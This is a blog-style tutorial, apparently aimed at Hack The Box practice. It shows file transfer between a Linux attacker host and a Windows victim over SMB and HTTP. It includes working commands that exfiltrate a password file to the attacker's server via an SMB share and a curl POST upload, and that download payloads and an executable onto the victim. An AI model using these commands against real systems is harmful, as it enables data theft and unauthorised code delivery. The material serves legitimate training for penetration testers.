1. In the previous article on File Transfer Techniques, we wrote about transferring files by converting it into base 64 and storing it in the clipboard.
2. However, this technique is not really suitable for large files.
3. Thus, in this post, I will be introducing two new techniques: Server Message Block (SMB) and Hypertext Transfer Protocol (HTTP)
4. As usual, I will assume that our attacker host is a Linux machine (`1.1.1.1`) while the other machine is a Windows machine (`2.2.2.2`).

# Server Message Block (SMB)
1. SMB is a Microsoft service/protocol. Thus, it will only work on Windows machines (usually). However, it is possible to use SMB on a Linux too.
2. The reason I introduce this technique is because it is very useful to exfiltrate information on Windows boxes in Hack The Box.
3. SMB works based on a server-and-client model.
4. To start an SMB server on our attacker host,
```sh
sudo impacket-smbserver myShare -smb2support ./smbShare -user test -password test
```
- `impacket-smbserver`: Impacket has provided us with an easy-to-use module for SMB server
- `myShare`: The name of the share that we will create
- `-smb2support`: Specifies that we will use SMB version 2. (SMB version 1 may be disabled by default on the Windows machine due to major security vulnerabilities, such as Eternal Blue)
- `./smbShare`: This is the directory that we will share with the clients
- `-user`: Specify username to access the share
- `-password`: Specify password to access the share

5. To mount the share on our victim host,
```cmd
net use n: \\1.1.1.1\myShare /u:test test
net use <drive-name>: \\<server-name>\<share-name> /u:<username> <password>
```
- `net use`: Command to mount a share
- Note that the drive name has to be an unused drive, so avoid the `C:` or `D:` drive.
## Linux <-> Windows
6. Now, if we copy a file into our `./smbShare` directory in our attacker host,
```sh
cp payload.txt ./smbShare
```
7. It will appear on the victim host's `n:\` drive.
```cmd
dir n:\
```
- I recommend copying the file to another folder we control because the network drive tends to be a bit slower.
8. The victim host can also copy files to share into this drive.
```cmd
copy password.txt n:\
```
- This file will be accessible in the attacker host
# Hypertext Transfer Protocol (HTTP)
1. I would usually use HTTP server when doing Linux boxes, but this technique should work for Windows boxes too. (HTTP works on a server-client model too)
2. To create a simple HTTP server on the attacker host, I like to use 
```sh
python3 -m uploadserver
```
- This will set a server at `<your-ip>:8000`
## Linux -> Windows
3. To pull a file from the attacker host into the victim host from the victim host,
```cmd
curl.exe http://1.1.1.1:8000/payload.txt
curl.exe http://<server-ip>:8000/payload.txt
```
- Also note that payload.txt must be in the same directory as the directory you set up your server (ie the directory you run `python3 -m uploadserver`)
- Note that `curl.exe` may not be available in some windows systems
4. An alternative will be to use Powershell `Invoke-WebRequest`
```powershell
Invoke-WebRequest -Uri "http://<server-ip>:<port>/backupscript.exe" -OutFile "C:\backupscript.exe"
```
## Windows -> Linux
5. You can also push a file from the victim host to the server (attacker host).
```cmd
curl -X POST http://1.1.1.1:8000/upload -F "files=@./password.txt"
curl -X POST http:/<server-ip>:8000/upload -F "files=@<path-to-file>"
```
